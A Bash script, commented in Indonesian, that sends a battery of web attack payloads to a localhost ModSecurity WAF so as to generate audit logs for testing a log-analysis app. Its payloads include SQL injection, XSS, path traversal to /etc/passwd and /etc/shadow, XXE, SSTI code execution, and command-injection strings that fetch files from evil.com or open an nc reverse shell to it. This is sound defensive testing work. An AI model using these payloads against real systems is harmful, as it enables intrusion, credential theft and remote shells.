#!/usr/bin/env bash
# =============================================================
# SEED WAF LOGS — ModSecurity + OWASP CRS
# =============================================================
# Tujuan : Menghasilkan banyak audit log untuk menguji web app.
# Target : Nginx + ModSecurity di localhost (WSL / Linux).
# Jalankan : chmod +x SEED_WAF_LOGS.sh && ./SEED_WAF_LOGS.sh
# =============================================================

set -euo pipefail

BASE_URL="http://127.0.0.1"
DELAY=0.3
TOTAL=0
BLOCKED=0
PASSED=0

hit() {
  local desc="$1"
  shift
  TOTAL=$((TOTAL + 1))
  code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$@" 2>/dev/null || echo "000")
  if [[ "$code" == "403" ]]; then
    BLOCKED=$((BLOCKED + 1))
    printf "  [403 BLOCKED] %s\n" "$desc"
  elif [[ "$code" == "000" ]]; then
    printf "  [CONN ERROR]  %s\n" "$desc"
  else
    PASSED=$((PASSED + 1))
    printf "  [%s PASSED]   %s\n" "$code" "$desc"
  fi
  sleep "$DELAY"
}

echo "=========================================="
echo "  SEED WAF LOGS — Mulai"
echo "  Target: $BASE_URL"
echo "=========================================="
echo ""

# ==========================================
# 1) SQL INJECTION (942xxx)
# ==========================================
echo "[1/10] SQL Injection ..."

hit "SQLi basic OR" \
  "$BASE_URL/?id=1%27%20OR%20%271%27%3D%271"

hit "SQLi UNION SELECT" \
  "$BASE_URL/?id=1%27%20UNION%20SELECT%201%2C2%2C3--"

hit "SQLi stacked WAITFOR" \
  "$BASE_URL/?id=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--"

hit "SQLi stacked query semicolon" \
  "$BASE_URL/?id=1%3BSELECT%20*%20FROM%20users"

hit "SQLi comment bypass" \
  "$BASE_URL/?user=admin%27/**/OR/**/1%3D1--"

hit "SQLi double encoded quote" \
  "$BASE_URL/?q=%2527%20OR%201%3D1"

hit "SQLi sleep benchmark" \
  "$BASE_URL/?id=1%27%20AND%20SLEEP(5)--"

hit "SQLi into outfile" \
  "$BASE_URL/?id=1%27%20INTO%20OUTFILE%20%27/tmp/shell.php%27"

hit "SQLi hex encoding" \
  "$BASE_URL/?id=0x31%27%20OR%201%3D1"

hit "SQLi information_schema" \
  "$BASE_URL/?id=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--"

hit "SQLi POST body login bypass" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "username=admin'%20OR%201%3D1--&password=anything"

hit "SQLi POST body UNION" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "search=test'%20UNION%20SELECT%20username,password FROM users--"

echo ""

# ==========================================
# 2) XSS / CROSS-SITE SCRIPTING (941xxx)
# ==========================================
echo "[2/10] XSS ..."

hit "XSS script alert" \
  "$BASE_URL/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

hit "XSS img onerror" \
  "$BASE_URL/?x=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"

hit "XSS svg onload" \
  "$BASE_URL/?x=%3Csvg%2Fonload%3Dalert(document.domain)%3E"

hit "XSS event handler onmouseover" \
  "$BASE_URL/?x=%22%20onmouseover%3Dalert(1)%20x%3D%22"

hit "XSS body onload" \
  "$BASE_URL/?x=%3Cbody%20onload%3Dalert(1)%3E"

hit "XSS iframe src javascript" \
  "$BASE_URL/?x=%3Ciframe%20src%3Djavascript%3Aalert(1)%3E%3C%2Fiframe%3E"

hit "XSS anchor href javascript" \
  "$BASE_URL/?x=%3Ca%20href%3Djavascript%3Aalert(1)%3Eclick%3C%2Fa%3E"

hit "XSS div style expression" \
  "$BASE_URL/?x=%3Cdiv%20style%3D%22background%3Aurl(javascript%3Aalert(1))%22%3E"

hit "XSS input autofocus" \
  "$BASE_URL/?x=%3Cinput%20autofocus%20onfocus%3Dalert(1)%3E"

hit "XSS details ontoggle" \
  "$BASE_URL/?x=%3Cdetails%20ontoggle%3Dalert(1)%20open%3E%3C%2Fdetails%3E"

hit "XSS POST JSON payload" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(1)</script>"}'

echo ""

# ==========================================
# 3) OS COMMAND INJECTION / RCE (932xxx)
# ==========================================
echo "[3/10] OS Command Injection ..."

hit "CMDi cat passwd" \
  "$BASE_URL/?cmd=%3Bcat%20%2Fetc%2Fpasswd"

hit "CMDi pipe id" \
  "$BASE_URL/?cmd=%7Cid"

hit "CMDi backtick uname" \
  "$BASE_URL/?exec=%24(uname+-a)"

hit "CMDi && ls" \
  "$BASE_URL/?cmd=test%26%26ls%20-la"

hit "CMDi || whoami" \
  "$BASE_URL/?cmd=x%7C%7Cwhoami"

hit "CMDi curl download" \
  "$BASE_URL/?url=%3Bcurl%20http%3A%2F%2Fevil.com%2Fshell.sh"

hit "CMDi wget" \
  "$BASE_URL/?url=%7Cwget%20http%3A%2F%2Fevil.com%2Fpayload"

hit "CMDi nc reverse shell" \
  "$BASE_URL/?cmd=%3Bnc%20-e%20%2Fbin%2Fbash%20evil.com%204444"

hit "CMDi python exec" \
  "$BASE_URL/?code=import%20os%3Bos.system(%27id%27)"

hit "CMDi bash -c" \
  "$BASE_URL/?cmd=%3Bbash%20-c%20%27id%27"

echo ""

# ==========================================
# 4) PATH TRAVERSAL / LFI (930xxx)
# ==========================================
echo "[4/10] Path Traversal / LFI ..."

hit "PT dot-dot-slash etc/passwd" \
  "$BASE_URL/?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"

hit "PT etc/shadow" \
  "$BASE_URL/?file=..%2F..%2F..%2F..%2Fetc%2Fshadow"

hit "PT double encoded" \
  "$BASE_URL/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"

hit "PT null byte injection" \
  "$BASE_URL/?file=..%2F..%2F..%2Fetc%2Fpasswd%00.jpg"

hit "PT windows path" \
  "$BASE_URL/?file=..\\..\\..\\windows\\win.ini"

hit "PT proc self" \
  "$BASE_URL/?file=%2Fproc%2Fself%2Fenviron"

hit "PT log file" \
  "$BASE_URL/?file=..%2F..%2F..%2Fvar%2Flog%2Fauth.log"

hit "PT nginx access log" \
  "$BASE_URL/?file=..%2F..%2F..%2Fvar%2Flog%2Fnginx%2Faccess.log"

echo ""

# ==========================================
# 5) REMOTE FILE INCLUSION / SSRF (931xxx)
# ==========================================
echo "[5/10] RFI / SSRF ..."

hit "RFI remote URL include" \
  "$BASE_URL/?include=http%3A%2F%2Fevil.com%2Fshell.txt"

hit "RFI HTTPS payload" \
  "$BASE_URL/?load=https%3A%2F%2Fevil.com%2Fpayload.php"

hit "RFI FTP protocol" \
  "$BASE_URL/?file=ftp%3A%2F%2Fevil.com%2Fbackdoor"

hit "SSRF internal metadata" \
  "$BASE_URL/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"

hit "SSRF localhost admin" \
  "$BASE_URL/?url=http%3A%2F%2F127.0.0.1%3A3306%2F"

hit "SSRF php input" \
  "$BASE_URL/?file=php%3A%2F%2Finput"

hit "SSRF data URI" \
  "$BASE_URL/?file=data%3Atext%2Fplain%3Bbase64%2CaGVsbG8%3D"

echo ""

# ==========================================
# 6) PROTOCOL ANOMALY / SCANNER SIGNATURES
# ==========================================
echo "[6/10] Protocol Anomaly / Scanner UA ..."

hit "UA sqlmap" \
  "$BASE_URL/" -H "User-Agent: sqlmap/1.9#stable"

hit "UA nikto" \
  "$BASE_URL/" -H "User-Agent: Nikto/2.1.6"

hit "UA acunetix" \
  "$BASE_URL/" -H "User-Agent: Acunetix Web Vulnerability Scanner"

hit "UA nessus" \
  "$BASE_URL/" -H "User-Agent: Mozilla/5.0 (Nessus)"

hit "UA nmap nse" \
  "$BASE_URL/" -H "User-Agent: Nmap Scripting Engine"

hit "UA havij" \
  "$BASE_URL/" -H "User-Agent: Havij 1.56"

hit "UA w3af" \
  "$BASE_URL/" -H "User-Agent: w3af.org"

hit "UA nuclei" \
  "$BASE_URL/" -H "User-Agent: Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"

hit "Host numeric IP" \
  "$BASE_URL/" -H "Host: 127.0.0.1"

echo ""

# ==========================================
# 7) PHP / ASP / JAVA INJECTION
# ==========================================
echo "[7/10] Code Injection ..."

hit "PHP wrapper" \
  "$BASE_URL/?file=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php"

hit "PHP preg_replace /e" \
  "$BASE_URL/?x=preg_replace(%2F.*%2Fe%2C%20system(%27id%27)%2C%20%27test%27)"

hit "ASP eval injection" \
  "$BASE_URL/?x=eval(Request(%27cmd%27))"

hit "Java deserialization" \
  "$BASE_URL/?data=rO0ABXNy..."

hit "SSTI Jinja2" \
  "$BASE_URL/?name=%7B%7B7*7%7D%7D"

hit "SSTI Twig" \
  "$BASE_URL/?name=%7B%7Bself.__class__.__mro__%7D%7D"

hit "Expression Language injection" \
  "$BASE_URL/?x=%24%7B7*7%7D"

echo ""

# ==========================================
# 8) WEB SHELL / MALWARE UPLOAD PATTERN
# ==========================================
echo "[8/10] Web Shell / Upload Pattern ..."

hit "PHP shell upload filename" \
  -X POST "$BASE_URL/upload" \
  -F "file=@/dev/null;filename=shell.php"

hit "Double extension" \
  "$BASE_URL/?file=image.php.jpg"

hit "Null byte extension" \
  "$BASE_URL/?file=shell.php%00.png"

hit "htaccess upload" \
  -X POST "$BASE_URL/upload" \
  -F "file=@/dev/null;filename=.htaccess"

echo ""

# ==========================================
# 9) HEADER INJECTION / REQUEST SMUGGLING
# ==========================================
echo "[9/10] Header Injection ..."

hit "CRLF injection in header" \
  "$BASE_URL/?redirect=http%3A%2F%2Fevil.com%0D%0AInjected-Header%3A+yes"

hit "X-Forwarded-For spoof" \
  "$BASE_URL/" -H "X-Forwarded-For: 0.0.0.0"

hit "X-Original-URL" \
  "$BASE_URL/" -H "X-Original-URL: /admin"

hit "Content-Type mismatch" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/xml" \
  -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

echo ""

# ==========================================
# 10) REALISTIC MIXED ATTACK CHAINS
# ==========================================
echo "[10/10] Mixed / Chained Attacks ..."

hit "SQLi + XSS combo GET" \
  "$BASE_URL/?id=1%27%20OR%201%3D1--&xss=%3Cscript%3Ealert(1)%3C%2Fscript%3E&file=..%2F..%2Fetc%2Fpasswd"

hit "SQLi + XSS + LFI combo POST" \
  -X POST "$BASE_URL/" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1--","comment":"<svg/onload=alert(1)>","path":"../../../../etc/passwd"}'

hit "Auth bypass + command injection" \
  -X POST "$BASE_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "user=admin'%20OR%20'1'%3D'1&pass=test;cat+/etc/passwd"

hit "XXE + SSRF combo" \
  -X POST "$BASE_URL/api" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><data>&xxe;</data>'

hit "SSTI + RCE combo" \
  "$BASE_URL/?name=%7B%7Bconfig.__class__.__init__.__globals__%5B'os'%5D.popen('id').read()%7D%7D"

echo ""
echo "=========================================="
echo "  SEED WAF LOGS — Selesai"
echo "  Total requests : $TOTAL"
echo "  Blocked (403)  : $BLOCKED"
echo "  Passed         : $PASSED"
echo "=========================================="
echo ""
echo "Cek audit log:"
echo "  sudo tail -100 /var/log/modsecurity/audit.log"
echo ""
echo "Cek via web app:"
echo "  Buka http://localhost:5000/realtime → Muat Log → pilih baris → Analyze"
